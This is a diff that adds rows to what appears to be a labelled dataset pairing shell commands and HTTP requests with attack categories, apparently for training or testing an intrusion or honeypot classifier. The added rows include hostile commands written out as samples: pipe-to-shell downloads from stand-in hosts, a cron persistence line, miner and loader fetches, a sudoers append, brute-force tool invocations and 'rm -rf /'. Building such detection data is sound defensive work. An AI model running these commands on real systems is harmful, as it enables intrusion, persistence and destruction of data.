@@ -36,9 +36,16 @@ uname -r,Reconnaissance
 GET /,Reconnaissance
 GET /wp-admin,Reconnaissance
 GET /admin,Reconnaissance
+GET /admin/login.php,Reconnaissance
+nmap -sV 127.0.0.1,Reconnaissance
+whois example.com,Reconnaissance
+dig any domain.com,Reconnaissance
+curl -I http://localhost,Reconnaissance
 USER root,Brute Force
 USER admin,Brute Force
 USER test,Brute Force
+USER postgres,Brute Force
+USER oracle,Brute Force
 PASS 123456,Brute Force
 PASS password,Brute Force
 PASS admin,Brute Force
@@ -50,8 +57,13 @@ auth:admin:admin123,Brute Force
 auth:test:test,Brute Force
 auth:root:password,Brute Force
 auth:ubuntu:ubuntu,Brute Force
+auth:guest:guest,Brute Force
 POST /login,Brute Force
 POST /api/login,Brute Force
+POST /auth,Brute Force
+hydra -l user -P pass.txt,Brute Force
+ncrack -u admin -P pass,Brute Force
+medusa -u root -p root,Brute Force
 sudo su,Privilege Escalation
 sudo -i,Privilege Escalation
 sudo bash,Privilege Escalation
@@ -68,6 +80,10 @@ usermod -aG sudo user,Privilege Escalation
 id root,Privilege Escalation
 sudo cat /etc/shadow,Privilege Escalation
 sudo /bin/bash,Privilege Escalation
+pkexec --version,Privilege Escalation
+sudo -l,Privilege Escalation
+find / -perm -4000 -type f,Privilege Escalation
+echo "root ALL=(ALL) ALL" >> /etc/sudoers,Privilege Escalation
 wget http://evil.com/shell.sh,Malware Attempt
 curl http://evil.com/backdoor,Malware Attempt
 chmod +x /tmp/x,Malware Attempt
@@ -86,6 +102,16 @@ GET /etc/passwd,Malware Attempt
 wget http://x.com/miner,Malware Attempt
 curl -o /tmp/x http://evil.com/x,Malware Attempt
 chmod +x /tmp/*.sh,Malware Attempt
+wget -q -O - http://1.2.3.4/bc.sh | sh,Malware Attempt
+curl -s http://1.2.3.4/bot | bash,Malware Attempt
+nohup ./xmrig &,Malware Attempt
+crontab -e,Malware Attempt
+echo "*/5 * * * * curl http://x/sh | sh",Malware Attempt
+wget -c http://malware.com/drop,Malware Attempt
+curl -O http://x.com/loader.so,Malware Attempt
+perl -e 'use Socket;',Malware Attempt
+ruby -rsocket -e 'c=TCPSocket.new',Malware Attempt
+rm -rf /,Malware Attempt
 cd /,Benign
 cd ~,Benign
 cd ..,Benign
@@ -99,3 +125,6 @@ echo test,Benign
 ll,Benign
 dir,Benign
 list,Benign
+echo "hello world",Benign
+date,Benign
+cal,Benign
